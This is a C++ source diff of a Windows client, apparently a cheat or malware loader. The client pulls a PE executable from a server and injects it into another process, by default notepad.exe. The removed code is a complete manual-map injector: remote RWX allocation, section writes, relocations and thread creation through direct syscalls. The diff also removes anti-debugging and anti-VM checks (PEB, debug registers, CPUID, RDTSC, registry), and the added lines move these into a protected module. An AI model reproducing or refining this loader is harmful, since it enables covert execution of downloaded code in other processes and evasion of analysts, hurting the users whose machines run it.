@@ -2,6 +2,7 @@
 #include "packet.hpp"
 #include "crypto.hpp"
 #include "compression.hpp"
+#include "protected_client_functions.hpp"
 
 #ifdef _WIN32
 #include "syscalls.hpp"
@@ -622,7 +623,7 @@ namespace client
 	 */
 	class game_client_t : public function_requester_t
 	{
-    net::Socket socket_;
+    net::socket_wrapper_t socket_;
     bool authenticated_ = false;
     std::array<uint8_t, proto::SESSION_KEY_SIZE> session_key_{};
     uint32_t current_challenge_ = 0;
@@ -649,7 +650,7 @@ namespace client
     uint32_t ping_sequence_ = 0;
 
 public:
-    [[nodiscard]] auto connect() -> std::expected<void, net::Error> {
+    [[nodiscard]] auto connect() -> std::expected<void, net::error_t> {
         auto result = net::connect(SERVER_IP, SERVER_PORT);
         if (!result) return std::unexpected(result.error());
 
@@ -688,7 +689,7 @@ public:
             auto received = socket_.recv(buffer);
 
             if (!received) {
-                if (received.error() == net::Error::WouldBlock) {
+                if (received.error() == net::error_t::would_block) {
                     std::this_thread::sleep_for(10ms);
                     continue;
                 }
@@ -709,17 +710,17 @@ public:
     }
 
 private:
-    auto send_connect() -> std::expected<void, net::Error> {
-        proto::Packet pkt{proto::PacketType::Connect};
+    auto send_connect() -> std::expected<void, net::error_t> {
+        proto::packet_t pkt{proto::packet_type_t::connect};
         return send_packet(pkt, false);
     }
 
-    auto send_packet(const proto::Packet& pkt, bool encrypt) -> std::expected<void, net::Error> {
+    auto send_packet(const proto::packet_t& pkt, bool encrypt) -> std::expected<void, net::error_t> {
         std::array<uint8_t, proto::MAX_PACKET_SIZE> buffer;
         uint16_t size = pkt.serialize(buffer);
 
         if (size == 0) {
-            return std::unexpected(net::Error::SendFailed);
+            return std::unexpected(net::error_t::send_failed);
         }
 
         auto result = socket_.send(std::span{buffer.data(), size});
@@ -730,7 +731,7 @@ private:
     }
 
     void send_heartbeat() {
-        proto::Packet pkt{proto::PacketType::Ack};
+        proto::packet_t pkt{proto::packet_type_t::ack};
         send_packet(pkt, false);
         last_heartbeat_sent_ = std::chrono::steady_clock::now();
     }
@@ -764,20 +765,20 @@ private:
 
         while (offset < data.size()) {
             auto remaining = data.subspan(offset);
-            auto packet_result = proto::Packet::deserialize(remaining);
+            auto packet_result = proto::packet_t::deserialize(remaining);
 
             if (!packet_result) break;
 
             auto& packet = *packet_result;
             packets_processed_++;
 
-            if (packet.has_flag(proto::PacketFlags::Encrypted) && authenticated_) {
+            if (packet.has_flag(proto::packet_flags_t::encrypted) && authenticated_) {
                 crypto::decrypt(session_key_, packet.payload_view(), packet.payload_view());
             }
 
-            if (packet.has_flag(proto::PacketFlags::Compressed)) {
+            if (packet.has_flag(proto::packet_flags_t::compressed)) {
                 std::array<uint8_t, proto::MAX_PAYLOAD_SIZE> decompressed;
-                if (auto result = compression::RLE::decompress(packet.payload_view(),
+                if (auto result = compression::rle_t::decompress(packet.payload_view(),
                                                               decompressed)) {
                     std::memcpy(packet.payload.data(), decompressed.data(), *result);
                     packet.header.length = *result;
@@ -785,43 +786,43 @@ private:
             }
 
             handle_packet(packet);
-            offset += sizeof(proto::PacketHeader) + packet.length();
+            offset += sizeof(proto::packet_header_t) + packet.length();
         }
     }
 
-    void handle_packet(const proto::Packet& packet) {
-        using enum proto::PacketType;
+    void handle_packet(const proto::packet_t& packet) {
+        using enum proto::packet_type_t;
 
         switch (packet.type()) {
-            case Challenge: {
-                auto* payload = packet.payload_as<proto::PayloadChallenge>();
+            case challenge: {
+                auto* payload = packet.payload_as<proto::payload_challenge_t>();
                 current_challenge_ = payload->challenge;
                 challenge_time_ = std::chrono::steady_clock::now();
                 send_challenge_response();
                 break;
             }
 
-            case SessionKey: {
-                auto* payload = packet.payload_as<proto::PayloadSessionKey>();
+            case session_key: {
+                auto* payload = packet.payload_as<proto::payload_session_key_t>();
                 session_key_ = payload->key;
                 authenticated_ = true;
                 break;
             }
 
-            case GameList: {
-                auto* payload = packet.payload_as<proto::PayloadGameList>();
+            case game_list: {
+                auto* payload = packet.payload_as<proto::payload_game_list_t>();
                 handle_game_list(*payload);
                 break;
             }
 
-            case PEChunk: {
-                auto* payload = packet.payload_as<proto::PayloadPEChunk>();
+            case pe_chunk: {
+                auto* payload = packet.payload_as<proto::payload_pe_chunk_t>();
                 handle_pe_chunk(*payload);
                 break;
             }
 
-            case FunctionResponse: {
-                auto* payload = packet.payload_as<proto::PayloadFunctionResponse>();
+            case function_response: {
+                auto* payload = packet.payload_as<proto::payload_function_response_t>();
                 handle_function_response(*payload);
                 break;
             }
@@ -831,94 +832,15 @@ private:
         }
     }
 
-    bool check_debugger_present() {
-#ifdef _WIN32
-        // Check 1: IsDebuggerPresent
-        if (IsDebuggerPresent()) return true;
-
-        // Check 2: CheckRemoteDebuggerPresent
-        BOOL remote_debugger = FALSE;
-        if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote_debugger) && remote_debugger) {
-            return true;
-        }
-
-        // Check 3: NtQueryInformationProcess(ProcessDebugPort)
-        auto& mgr = shadow::SyscallManager::instance();
-        DWORD_PTR debug_port = 0;
-        if (auto result = mgr.query_information_process(
-                GetCurrentProcess(), 7, &debug_port, sizeof(debug_port), nullptr);
-            result && debug_port != 0) {
-            return true;
-        }
-
-        // Check 4: Hardware breakpoints (DR0-DR7)
-        CONTEXT ctx{};
-        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-        if (GetThreadContext(GetCurrentThread(), &ctx)) {
-            if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
-                return true;
-            }
-        }
-
-        // Check 5: PEB BeingDebugged flag
-        PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
-        if (peb && peb->BeingDebugged) return true;
-#endif
-        return false;
-    }
-
-    bool check_vm_present() {
-#ifdef _WIN32
-        // Check 1: CPUID hypervisor bit
-        int cpuInfo[4] = {0};
-        __cpuid(cpuInfo, 1);
-        if (cpuInfo[2] & (1 << 31)) return true;  // Hypervisor present bit
-
-        // Check 2: CPUID vendor string
-        __cpuid(cpuInfo, 0x40000000);
-        char vendor[13] = {0};
-        std::memcpy(vendor, &cpuInfo[1], 4);
-        std::memcpy(vendor + 4, &cpuInfo[2], 4);
-        std::memcpy(vendor + 8, &cpuInfo[3], 4);
-
-        if (std::string_view(vendor).find("VMware") != std::string_view::npos ||
-            std::string_view(vendor).find("VBoxVBox") != std::string_view::npos ||
-            std::string_view(vendor).find("Microsoft Hv") != std::string_view::npos) {
-            return true;
-        }
-
-        // Check 3: Timing attack (RDTSC)
-        uint64_t start = __rdtsc();
-        Sleep(10);
-        uint64_t end = __rdtsc();
-        uint64_t elapsed = end - start;
-
-        // VMs typically have much higher RDTSC values for the same time
-        if (elapsed > 1000000) return true;
-
-        // Check 4: Check for VM registry keys
-        HKEY hKey;
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            RegCloseKey(hKey);
-            return true;
-        }
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            RegCloseKey(hKey);
-            return true;
-        }
-#endif
-        return false;
-    }
-
     void send_challenge_response() {
-        proto::Packet pkt{proto::PacketType::ChallengeResponse};
-        auto* payload = pkt.payload_as<proto::PayloadChallengeResponse>();
+        proto::packet_t pkt{proto::packet_type_t::challenge_response};
+        auto* payload = pkt.payload_as<proto::payload_challenge_response_t>();
 
         payload->challenge_solution = crypto::solve_challenge(current_challenge_);
 
 #ifdef _WIN32
-        payload->is_debugged = check_debugger_present() ? 1 : 0;
-        payload->is_vm = check_vm_present() ? 1 : 0;
+        payload->is_debugged = client::check_debugger_present() ? 1 : 0;
+        payload->is_vm = client::check_vm_present() ? 1 : 0;
         payload->is_suspended = 0;  // Could check for suspended threads
 
         // Hide thread from debugger
@@ -934,18 +856,18 @@ private:
         send_packet(pkt, false);
     }
 
-    void handle_game_list(const proto::PayloadGameList& payload) {
+    void handle_game_list(const proto::payload_game_list_t& payload) {
         // Auto-select first game for demo
         if (payload.count > 0) {
-            proto::Packet pkt{proto::PacketType::GameSelect};
-            auto* select = pkt.payload_as<proto::PayloadGameSelect>();
+            proto::packet_t pkt{proto::packet_type_t::game_select};
+            auto* select = pkt.payload_as<proto::payload_game_select_t>();
             select->game_id = 0;
             pkt.set_payload(*select);
             send_packet(pkt, true);
         }
     }
 
-    void handle_pe_chunk(const proto::PayloadPEChunk& payload) {
+    void handle_pe_chunk(const proto::payload_pe_chunk_t& payload) {
         if (payload.chunk_index == 0) {
             pe_buffer_.resize(payload.total_size);
             pe_entry_rva_ = payload.entry_rva;
@@ -963,8 +885,8 @@ private:
 
     // FunctionRequester interface implementation
     bool request_function(uint32_t marker_hash) override {
-        proto::Packet pkt{proto::PacketType::FunctionRequest};
-        auto* payload = pkt.payload_as<proto::PayloadFunctionRequest>();
+        proto::packet_t pkt{proto::packet_type_t::function_request};
+        auto* payload = pkt.payload_as<proto::payload_function_request_t>();
         payload->marker_hash = marker_hash;
         payload->timestamp = static_cast<uint32_t>(std::time(nullptr));
         pkt.set_payload(*payload);
@@ -972,7 +894,7 @@ private:
         return send_packet(pkt, true).has_value();
     }
 
-    void handle_function_response(const proto::PayloadFunctionResponse& payload) {
+    void handle_function_response(const proto::payload_function_response_t& payload) {
         auto& storage = bytecode_storage_t::instance();
 
         // Extract function name (null-terminated)
@@ -1001,144 +923,31 @@ private:
     }
 
 #ifdef _WIN32
-    uint32_t find_process_by_name(std::string_view process_name) {
-        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (snapshot == INVALID_HANDLE_VALUE) return 0;
-
-        PROCESSENTRY32W entry{};
-        entry.dwSize = sizeof(entry);
-
-        if (Process32FirstW(snapshot, &entry)) {
-            do {
-                // Convert wide string to multi-byte for comparison
-                char name[MAX_PATH];
-                WideCharToMultiByte(CP_UTF8, 0, entry.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
-
-                if (process_name == name) {
-                    CloseHandle(snapshot);
-                    return entry.th32ProcessID;
-                }
-            } while (Process32NextW(snapshot, &entry));
-        }
-
-        CloseHandle(snapshot);
-        return 0;
-    }
-
-    bool validate_pe() {
-        if (pe_buffer_.size() < sizeof(IMAGE_DOS_HEADER)) return false;
-
-        auto dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(pe_buffer_.data());
-        if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) return false;
-
-        if (pe_buffer_.size() < dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return false;
-
-        auto nt_headers = reinterpret_cast<IMAGE_NT_HEADERS*>(
-            pe_buffer_.data() + dos_header->e_lfanew
-        );
-        if (nt_headers->Signature != IMAGE_NT_SIGNATURE) return false;
-
-        return true;
-    }
-
     void inject_pe() {
-        auto& mgr = shadow::SyscallManager::instance();
+        /*
+           use protected function system for PE injection
+        */
+        std::string target{ target_process_.empty() ? "notepad.exe" : target_process_ };
+        uint64_t base_address{ 0 };
 
-        // Validate PE
-        if (!validate_pe()) return;
+        bool success{ client::inject_pe(
+            pe_buffer_.data(),
+            pe_buffer_.size(),
+            pe_entry_rva_,
+            target.c_str(),
+            target.size(),
+            &base_address
+        ) };
 
-        // Find target process
-        uint32_t pid = find_process_by_name(target_process_.empty() ? "notepad.exe" : target_process_);
-        if (pid == 0) return;
-
-        auto process_result = mgr.open_process(pid, PROCESS_ALL_ACCESS);
-        if (!process_result) return;
-        auto& process = *process_result;
-
-        // Parse PE headers
-        auto dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(pe_buffer_.data());
-        auto nt_headers = reinterpret_cast<IMAGE_NT_HEADERS*>(
-            pe_buffer_.data() + dos_header->e_lfanew
-        );
-
-        size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
-
-        // Allocate memory for PE
-        auto base_result = mgr.allocate_memory(
-            process.get(), nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
-        );
-        if (!base_result) return;
-
-        void* remote_base = *base_result;
-
-        // Write headers
-        size_t headers_size = nt_headers->OptionalHeader.SizeOfHeaders;
-        mgr.write_memory(process.get(), remote_base,
-                        std::span{pe_buffer_.data(), headers_size});
-
-        // Write sections
-        auto section = IMAGE_FIRST_SECTION(nt_headers);
-        for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i, ++section) {
-            if (section->SizeOfRawData == 0) continue;
-
-            void* section_va = static_cast<uint8_t*>(remote_base) + section->VirtualAddress;
-            mgr.write_memory(process.get(), section_va,
-                           std::span{pe_buffer_.data() + section->PointerToRawData,
-                                    section->SizeOfRawData});
-        }
-
-        // Process relocations (simplified)
-        if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
-            uint64_t delta = reinterpret_cast<uint64_t>(remote_base) -
-                           nt_headers->OptionalHeader.ImageBase;
-
-            auto reloc_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-            auto reloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
-                pe_buffer_.data() + reloc_dir.VirtualAddress
-            );
-
-            while (reloc->VirtualAddress) {
-                uint8_t* dest = static_cast<uint8_t*>(remote_base) + reloc->VirtualAddress;
-                uint16_t* reloc_data = reinterpret_cast<uint16_t*>(
-                    reinterpret_cast<uint8_t*>(reloc) + sizeof(IMAGE_BASE_RELOCATION)
-                );
-
-                uint32_t num_entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
-
-                for (uint32_t i = 0; i < num_entries; ++i) {
-                    uint16_t type = reloc_data[i] >> 12;
-                    uint16_t offset = reloc_data[i] & 0xFFF;
-
-                    if (type == IMAGE_REL_BASED_DIR64) {
-                        uint64_t* patch_addr = reinterpret_cast<uint64_t*>(dest + offset);
-                        *patch_addr += delta;
-                    }
-                }
-
-                reloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
-                    reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock
-                );
-            }
-
-            // Write back relocated image
-            mgr.write_memory(process.get(), remote_base, pe_buffer_);
-        }
-
-        // Set memory protections (simplified - should be per-section)
-        mgr.protect_memory(process.get(), remote_base, image_size, PAGE_EXECUTE_READ);
-
-        // Create thread at entry point
-        void* entry = static_cast<uint8_t*>(remote_base) +
-                     nt_headers->OptionalHeader.AddressOfEntryPoint;
-        auto thread_result = mgr.create_thread(process.get(), entry, remote_base);
-
-        // Send completion
-        proto::Packet pkt{proto::PacketType::PEComplete};
-        auto* complete = pkt.payload_as<proto::PayloadPEComplete>();
-        complete->success = thread_result.has_value() ? 1 : 0;
-        complete->base_address = reinterpret_cast<uint64_t>(remote_base);
-        pkt.set_payload(*complete);
-        send_packet(pkt, true);
+        /*
+           send completion packet
+        */
+        proto::packet_t pkt{ proto::packet_type_t::pe_complete };
+        auto* complete{ pkt.payload_as<proto::payload_pe_complete_t>() };
+        complete->success = success ? 1 : 0;
+        complete->base_address = base_address;
+        pkt.set_payload( *complete );
+        send_packet( pkt, true );
     }
 #endif
 };
